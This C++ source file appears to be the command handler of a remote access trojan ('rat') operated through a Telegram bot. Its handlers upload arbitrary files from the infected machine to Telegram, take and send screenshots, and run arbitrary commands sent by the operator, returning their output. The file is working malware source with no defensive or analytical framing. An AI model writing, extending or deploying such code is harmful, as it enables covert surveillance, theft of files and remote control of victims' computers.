/*rat_handler/src/threaded_handler.cpp*/
#include "rat/Handler.hpp"
#include "rat/media.hpp"
#include "rat/system.hpp"
#include <boost/algorithm/string.hpp>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <memory>
#include <mutex>
#include <string>
#include <sstream>
#include <filesystem>
#include "process.hpp" //tiny-process-library
#include "rat/handler/debug.hpp"

namespace rat::handler {
constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB;

// Command handler implementations
/*This method cannot run asynchronously for big files because the upload will be
 * interrupted from the https requests that are sent from the parent thread */

void Handler::handleGetCommand() {
  if (command.parameters.empty()) {
    this->bot->sendMessage("No file specified");
    return;
  }

  const auto file_path = rat::system::normalizePath(command.parameters[0]);
  if (!std::filesystem::exists(file_path)) {
    this->bot->sendMessage(
        fmt::format("File does not exist: {}", file_path.string()));
    return;
  }

  const size_t file_size = std::filesystem::file_size(file_path);
  HANDLER_DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(),
                    file_size);

  if (file_size < 2 * 1024 * KB) {
    // small file → sync
    this->bot->sendFile(file_path);
  } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {

    this->long_process_pool->enqueue([this, &file_path] {
      HANDLER_DEBUG_LOG("Async upload {}", file_path.string());
      std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
      this->backing_bot->sendMessage(
          fmt::format("File: {} will be uploaded", file_path.string()));
      auto resp = this->backing_bot->sendFile(file_path);

      if (resp != rat::tbot::BotResponse::SUCCESS) {
        HANDLER_ERROR_LOG("Failed to upload {}", file_path.string());
      }
    });
  } else {
    this->bot->sendMessage(fmt::format("File too big for Telegram (max 50 MB "
                                       "or /get method 2MB), this one is {}",
                                       file_size));
  }
}

void Handler::handleScreenshotCommand() {
  auto image_path = std::filesystem::path(
      fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored()));
  this->short_process_pool->enqueue([this, image_path] {
    std::string output_buffer;
    bool success =
        rat::media::screenshot::takeScreenshot(image_path, output_buffer);

    std::lock_guard<std::mutex> lock(backing_bot_mutex);

    if (success && std::filesystem::exists(image_path)) {
      HANDLER_DEBUG_LOG("{} taken", image_path.string());

      if (this->backing_bot->sendPhoto(image_path) !=
          rat::tbot::BotResponse::SUCCESS) {
        HANDLER_ERROR_LOG("Failed uploading {}", image_path.string());
      }
    }
    if (!output_buffer.empty()) {
      this->backing_bot->sendMessage(output_buffer);
    }
    rat::system::removeFile(image_path);
  });

  this->bot->sendMessage("Screenshot command launched.");
}

void Handler::parseAndHandleProcessCommand() {
    const std::string& message_text = this->telegram_update->message.text;

    this->parseTelegramMessageToCommand();

    HANDLER_DEBUG_LOG("Creating the process manager for the command {}", message_text);

    this->long_process_pool->enqueue([this]() {
        std::ostringstream stdout_stream;
        std::ostringstream stderr_stream;

        std::mutex stdout_mutex;
        std::mutex stderr_mutex;

        auto catching_stdout_lambda = [&stdout_stream, &stdout_mutex](const char *bytes,
                                                                  size_t n_bytes) {
            std::lock_guard<std::mutex> lock(stdout_mutex);
            stdout_stream.write(bytes, n_bytes);
        };

        auto catching_stderr_lambda = [&stderr_stream, &stderr_mutex](const char *bytes,
                                                                  size_t n_bytes) {
            std::lock_guard<std::mutex> lock(stderr_mutex);
            stderr_stream.write(bytes, n_bytes);
        };

        TinyProcessLib::Process process(
            this->command.parameters,
            std::filesystem::current_path().string(),
            catching_stdout_lambda,
            catching_stderr_lambda
        );

        const int process_exit_code = process.get_exit_status();

        const std::string final_message = fmt::format(
            "Exit_Code:{}\nSTDOUT:{}\nSTDERR:{}\n",
            process_exit_code,
            stdout_stream.str(),
            stderr_stream.str()
        );

        constexpr size_t TELEGRAM_LIMIT = 3000; // 3 KB safe cap

        std::unique_lock<std::mutex> lock_bot(this->backing_bot_mutex);

        if (final_message.size() <= TELEGRAM_LIMIT) {
            // Safe to send inline
            this->backing_bot->sendMessage(final_message);
        } else {
            // Too big → dump to file
            std::string filename = fmt::format("process-{}.txt", ::rat::system::getCurrentDateTime_Underscored());
            std::ofstream outfile(filename, std::ios::trunc);
            outfile << final_message;
            outfile.close();

            this->backing_bot->sendFile(filename, "Process output too large, see attached file.");
            std::filesystem::remove(filename);
        }
    });
}
} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
